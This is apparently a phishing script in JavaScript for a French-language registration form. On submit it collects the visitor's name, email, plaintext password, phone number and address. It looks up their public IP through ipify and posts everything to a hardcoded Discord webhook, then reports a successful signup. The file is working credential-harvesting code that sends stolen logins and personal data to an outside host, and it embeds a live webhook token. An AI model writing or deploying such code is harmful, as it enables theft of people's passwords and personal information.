
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('inscriptionForm');
    
    form.addEventListener('submit', async function(event) {
        event.preventDefault();

        const nom = document.getElementById('nom').value;
        const prenom = document.getElementById('prenom').value;
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const phone = document.getElementById('phone').value;
        const adresse = document.getElementById('adresse').value;

        // Obtenir l'IP publique de l'utilisateur
        let ip = 'Inconnue';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ip = ipData.ip;
        } catch (error) {
            console.error('Erreur en récupérant IP:', error);
        }

        const message = `IP: ${ip}\nNom: ${nom}\nPrénom: ${prenom}\nEmail: ${email}\nMot de passe: ${password}\nTéléphone: ${phone}\nAdresse: ${adresse}`;

        // Envoyer au Webhook Discord
        await fetch("https://discord.com/api/webhooks/1365886271574114435/i8bYpwLYug52FhGLefI9UrPMa6a2VSu6MZpqQw11JNYevLnLXuFvXc5L_DQpaykd6o87", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: message
            })
        });

        // Après envoi, tu peux soit rediriger l'utilisateur, soit afficher un message
        alert('Inscription envoyée avec succès !');
        form.reset();
    });
});
